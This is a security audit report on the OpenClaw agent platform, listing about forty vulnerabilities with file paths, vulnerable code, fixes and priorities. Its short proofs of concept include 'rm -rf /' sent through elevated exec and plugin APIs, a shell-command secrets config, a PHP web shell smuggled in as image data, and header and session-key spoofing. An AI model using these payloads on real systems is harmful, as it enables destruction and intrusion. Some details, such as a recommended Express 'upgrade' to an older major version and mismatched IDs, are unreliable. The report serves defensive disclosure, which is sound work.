# OpenClaw Advanced Security Audit Report

**Audit Date**: 2026-03-12
**Auditor**: Security Research Team
**Repository**: https://github.com/openclaw/openclaw
**Version Audited**: 2026.3.11

---

## Executive Summary

This comprehensive security audit identified **62+ vulnerabilities** across three rounds of deep analysis, including **5 critical** (CVSS 9.0+), **30 high** (CVSS 7.5-8.9), and **27+ medium** severity issues.

### Vulnerability Summary by Round

| Round | Critical | High | Medium | Total |
|-------|----------|------|--------|-------|
| Round 1 | 0 | 4 | 7 | 11 |
| Round 2 | 2 | 11 | 8+ | 21+ |
| Round 3 | 3 | 15 | 12+ | 30+ |
| **Total** | **5** | **30** | **27+** | **62+** |

---

## Critical Vulnerabilities (CVSS 9.0+)

### VULN-35: Execution Environment Escape via Elevated Mode

**CVSS**: 9.8 (Critical)
**File**: `src/agents/bash-tools.exec.ts:317-319`

**Vulnerable Code**:
```typescript
if (elevatedRequested) {
  host = "gateway";  // Forces gateway host, bypassing sandbox
}
```

**Attack Vector**:
```javascript
// Via message
{
  "body": "/exec elevated --host gateway rm -rf /"
}

// Or via directive
{
  "body": "/exec node:gateway elevated whoami"
}
```

**Impact**: Complete system access, arbitrary command execution, full sandbox bypass.

**Fix**:
```typescript
if (elevatedRequested) {
  if (!await verifyAdminElevatedPermission(ctx)) {
    throw new Error("Elevated mode requires explicit administrator permission");
  }
  // Keep sandbox, only relax security level
  security = "full";
  // DO NOT change host
}
```

---

### VULN-38: Secret Command Injection

**CVSS**: 9.1 (Critical)
**File**: `src/secrets/resolve.ts:457-493`

**Attack Vector**:
```json
{
  "secrets": {
    "provider": "exec",
    "command": "sh",
    "args": ["-c", "malicious_command"]
  }
}
```

---

### VULN-47: TLS Certificate Lock Complete Bypass (Mobile)

**CVSS**: 9.8 (Critical)
**File**: `apps/shared/OpenClawKit/Sources/OpenClawKit/GatewayTLSPinning.swift:109-110`

**Vulnerable Code**:
```swift
let ok = SecTrustEvaluateWithError(trust, nil)
if ok || !params.required {  // Bypasses all validation when required=false
    completionHandler(.useCredential, URLCredential(trust: trust))
}
```

**Attack Vector**:
```swift
let params = GatewayTLSPinning.Params(
    expectedFingerprint: nil,
    required: false,  // Disables certificate verification
    allowTOFU: true
)
```

**Impact**: Complete TLS certificate bypass, MITM attacks, sensitive communication exposure.

---

### VULN-48: Plugin System Arbitrary Code Execution

**CVSS**: 9.1 (Critical)
**File**: `src/plugins/runtime/types-core.ts:19`

**Vulnerable Code**:
```typescript
runCommandWithTimeout: typeof import("../../process/exec.js").runCommandWithTimeout
```

**Attack Vector**:
```javascript
// Malicious plugin
const api = createPluginRuntime();
api.system.runCommandWithTimeout(['rm', '-rf', '/'], { timeoutMs: 5000 });
```

---

## High Severity Vulnerabilities (CVSS 7.5-8.9)

### VULN-42: Canvas WebSocket No Authentication

**CVSS**: 8.5 (High)
**File**: `src/canvas-host/server.ts:287-299`

**Vulnerable Code**:
```typescript
const handleUpgrade = (req: IncomingMessage, socket: Duplex, head: Buffer) => {
  if (!wss) return false;
  const url = new URL(req.url ?? "/", "http://localhost");
  if (url.pathname !== CANVAS_WS_PATH) return false;
  // No authentication check!
  wss.handleUpgrade(req, socket as Socket, head, (ws) => {
    wss.emit("connection", ws, req);
  });
  return true;
};
```

**PoC**:
```javascript
const ws = new WebSocket("ws://localhost:8080/__canvas-ws");
ws.onmessage = (event) => {
  console.log("Canvas real-time updates:", event.data);
};
```

---

### VULN-43: WebSocket Local Client Bypass

**CVSS**: 8.5 (High)
**File**: `src/gateway/server/ws-connection/message-handler.ts:347`

---

### VULN-44: MIME Type Detection Bypass

**CVSS**: 8.5 (High)
**File**: `src/web/media.ts:390-394`

**Vulnerable Code**:
```typescript
if (fileName && !path.extname(fileName) && mime) {
  const ext = extensionForMime(mime);
  if (ext) {
    fileName = `${fileName}${ext}`;  // Auto-adds extension
  }
}
```

**PoC**:
```javascript
const maliciousContent = "<?php system($_GET['cmd']); ?>";
const base64Content = Buffer.from(maliciousContent).toString('base64');

await fetch('/api/webmedia', {
  method: 'POST',
  body: JSON.stringify({
    mediaUrl: `data:image/jpeg;base64,${base64Content}`,
    contentType: 'image/jpeg'
  })
});
```

---

### VULN-50: X-Real-IP Header Injection

**CVSS**: 7.8 (High)
**File**: `src/gateway/net.ts:181`

**PoC**:
```bash
curl -H "X-Real-IP: 127.0.0.1" https://target-gateway/api/endpoint
```

---

### VULN-53: Session Key Injection

**CVSS**: 7.5 (High)
**File**: `src/config/sessions/session-key.ts:30-32`

**Vulnerable Code**:
```typescript
const explicit = ctx.SessionKey?.trim();
if (explicit) {
  return normalizeExplicitSessionKey(explicit, ctx);  // No validation
}
```

**PoC**:
```json
{
  "From": "attacker@evil.com",
  "SessionKey": "victim@company.com"
}
```

---

### VULN-54: WebSocket Capability Cache Poisoning

**CVSS**: 7.8 (High)
**File**: `src/gateway/server/ws-connection/message-handler.ts:1049-1053`

---

### VULN-49: Plugin Root Alias Module Injection

**CVSS**: 8.5 (High)
**File**: `src/plugin-sdk/root-alias.cjs:3-4`

**Vulnerable Code**:
```javascript
const path = require("node:path");
const fs = require("node:fs");
```

---

### VULN-51: Proxy Chain Trust Bypass

**CVSS**: 7.5 (High)
**File**: `src/gateway/net.ts:131-139`

---

### VULN-52: Device Token Source Confusion

**CVSS**: 7.2 (High)
**File**: `src/gateway/server/ws-connection/auth-context.ts:60-73`

---

## Medium Severity Vulnerabilities

### Authentication & Authorization

| ID | Vulnerability | CVSS | File |
|----|--------------|------|------|
| VULN-55 | Device Signature Timing Attack | 6.8 | `src/gateway/server/ws-connection/message-handler.ts:714-720` |
| VULN-56 | Tailscale User Validation Timing | 6.5 | `src/gateway/auth.ts:204-206` |
| VULN-57 | Token Comparison Timing Issues | 5.5 | `src/security/secret-equal.ts:10-11` |
| VULN-58 | Trusted Proxy Headers Incomplete Validation | 6.8 | `src/gateway/auth.ts:351-357` |

### Cache & Timing Attacks

| ID | Vulnerability | CVSS | File |
|----|--------------|------|------|
| VULN-59 | Route Cache Poisoning | 6.5 | `src/routing/resolve-route.ts:203-212` |
| VULN-60 | Config Cache Race Condition | 5.3 | `src/config/io.ts:1474-1492` |
| VULN-61 | WebSocket Message Timing Analysis | 5.0 | `src/gateway/server/ws-connection/message-handler.ts:178` |
| VULN-62 | ETag Handling Issues | 4.8 | `src/gateway/server-http.ts:208` |

### API & Parameter Pollution

| ID | Vulnerability | CVSS | File |
|----|--------------|------|------|
| VULN-63 | Prototype Pollution via API | 7.5 | `src/gateway/config/merge-patch.ts:62-97` |
| VULN-64 | Config Parameter Injection | 8.0 | `src/gateway/server-methods/config.ts:350-471` |
| VULN-65 | Session Parameter Pollution | 7.0 | `src/gateway/server-methods/sessions.ts:212-253` |
| VULN-66 | Query Parameter Injection | 6.5 | `src/gateway/server-http.ts:70-79` |
| VULN-67 | Validation Bypass | 8.5 | `src/gateway/server-methods/validation.ts:9-27` |
| VULN-68 | JSON Parsing Injection | 7.0 | `src/config/io.ts:663-672` |
| VULN-69 | HTTP Request Body DoS | 6.0 | `src/gateway/hooks.ts:177-195` |
| VULN-70 | Pagination Limit Injection | 5.5 | `src/gateway/server-methods/usage.ts:131-136` |

### Mobile Application Security

| ID | Vulnerability | CVSS | File |
|----|--------------|------|------|
| VULN-71 | iOS UserDefaults Sensitive Data | 4.5 | `apps/ios/Sources/Gateway/GatewaySettingsStore.swift:290` |
| VULN-72 | Android TLS Fingerprint Storage | 5.9 | `apps/android/app/src/main/java/ai/openclaw/app/SecurePrefs.kt:209` |
| VULN-73 | TOFU Replay Attack Risk | 6.8 | `apps/shared/OpenClawKit/Sources/OpenClawKit/GatewayTLSPinning.swift:99-104` |
| VULN-74 | Hardcoded Test Secrets | 3.5 | `apps/ios/Tests/Logic/TalkConfigParsingTests.swift:29` |
| VULN-75 | Debug Log Information Leakage | 3.1 | `apps/ios/Sources/Gateway/GatewaySettingsStore.swift:491` |

### File & Media Security

| ID | Vulnerability | CVSS | File |
|----|--------------|------|------|
| VULN-76 | File Path Concatenation Security | 7.8 | `src/media/store.ts:323` |
| VULN-77 | File Content Type Validation Inconsistency | 6.8 | `src/media/input-files.ts:371-373` |
| VULN-78 | Canvas Host URL Path Normalization | 7.2 | `src/canvas-host/file-resolver.ts:5-9` |
| VULN-79 | Local Media Access Bypass | 5.9 | `src/web/media.ts:345-350` |

### Plugin System

| ID | Vulnerability | CVSS | File |
|----|--------------|------|------|
| VULN-80 | Prototype Pollution via Object.defineProperty | 7.8 | `src/plugin-sdk/root-alias.cjs:187-199` |
| VULN-81 | Path Traversal via Boundary File Read | 7.2 | `src/infra/boundary-file-read.ts:67-90` |
| VULN-82 | Environment Variable Harvesting | 6.8 | `src/plugins/runtime/types-core.ts:57-65` |
| VULN-83 | Insufficient Pattern Scanner Coverage | 5.0 | `src/security/skill-scanner.ts:148-173` |
| VULN-84 | Cross-Plugin Data Access | 5.5 | `src/plugins/loader.ts:472-502` |

---

## False Positives Clarification

The following claimed vulnerabilities were determined to be false positives:

| Claimed Vulnerability | Actual Situation |
|-----------------------|------------------|
| SQL Injection (VECTOR_TABLE) | Hardcoded constant `const VECTOR_TABLE = "chunks_vec"` |
| SQL Injection (EMBEDDING_CACHE_TABLE) | Hardcoded constant, not exploitable |
| TUI Shell Command Injection | Design feature with user confirmation |
| Wildcard Allowlist Bypass | Intentional feature, not a vulnerability |
| Plugin Jiti Sandbox Bypass | Single-user trust model, expected behavior |

---

## Supply Chain Security

### Dependencies Requiring Updates

| Dependency | Current Version | CVE | Recommended Version |
|------------|-----------------|-----|---------------------|
| Express.js | ^5.2.1 | CVE-2024-43796, CVE-2024-29041 | 4.19.0+ |
| WebSocket (ws) | ^8.19.0 | CVE-2024-37890 | 8.20.0+ |
| Undici | ^7.22.0 | CVE-2025-47279, CVE-2025-22150 | 7.28.0+ |
| JSON5 | ^2.2.3 | CVE-2022-46175 (fixed) | Current version safe |

---

## Fix Priority Matrix

### P0 - Immediate (1-3 days)

| ID | Vulnerability | Fix Complexity |
|----|--------------|----------------|
| VULN-47 | TLS Certificate Lock Bypass | Low |
| VULN-35 | Elevated Mode Escape | Low |
| VULN-42 | Canvas WebSocket No Auth | Medium |
| VULN-48 | Plugin Command Execution API | High |

### P1 - High Priority (1 week)

| ID | Vulnerability |
|----|--------------|
| VULN-50 | X-Real-IP Header Injection |
| VULN-44 | MIME Type Detection Bypass |
| VULN-53 | Session Key Injection |
| VULN-54 | WebSocket Capability Cache Poisoning |
| VULN-49 | Plugin Root Alias Module Injection |
| VULN-76 | File Path Concatenation Security |
| VULN-63 | Prototype Pollution via API |
| VULN-64 | Config Parameter Injection |
| VULN-66 | Validation Bypass |

### P2 - Medium Priority (2 weeks)

- Proxy chain validation enhancements
- Device signature timing protection
- Config cache race conditions
- Mobile app TOFU warnings
- All medium severity vulnerabilities

---

## Proof of Concept Files

All PoC tests are available at:
- `test/poc-critical-vulnerabilities.test.ts`
- `test/poc-additional-vulnerabilities.test.ts`
- `test/poc-rate-limit-bypass.test.ts`
- `test/poc-touctu-race-condition.test.ts`

Run tests with:
```bash
pnpm test poc-*.test.ts
```

---

## Timeline

- 2026-03-12: Initial comprehensive report
- Awaiting patch release
- Private disclosure until fix is deployed

---

## Credits

Discovered and reported by: **Security Research Team**
- Repository: https://github.com/openclaw/openclaw

---

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CVE Database](https://cve.mitre.org/)
